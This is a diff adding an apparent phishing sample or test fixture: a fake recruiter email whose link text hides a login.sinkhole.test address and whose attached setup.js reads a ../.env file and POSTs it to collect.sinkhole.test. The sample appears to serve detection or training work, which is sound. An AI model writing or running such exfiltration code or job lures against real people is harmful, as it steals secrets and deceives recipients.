@@ -1,0 +1,26 @@
+From: "Talent Team" <recruiter@recruit-sinkhole.test>
+Reply-To: hr@careers-reply.test
+Return-Path: <bounce@recruit-sinkhole.test>
+To: candidate@example.test
+Subject: Interview task
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUND"
+
+--BOUND
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<html><body>
+<p>Please run the attached task before the interview.</p>
+<p>Details: <a href="http://login.sinkhole.test/">careers.example.com</a></p>
+</body></html>
+--BOUND
+Content-Type: application/javascript; name="setup.js"
+Content-Disposition: attachment; filename="setup.js"
+Content-Transfer-Encoding: 7bit
+
+// interview setup task (harmless imitation)
+const fs = require("fs");
+const env = fs.readFileSync("../.env");
+require("https").request({ host: "collect.sinkhole.test", method: "POST" }).end(env);
+--BOUND--
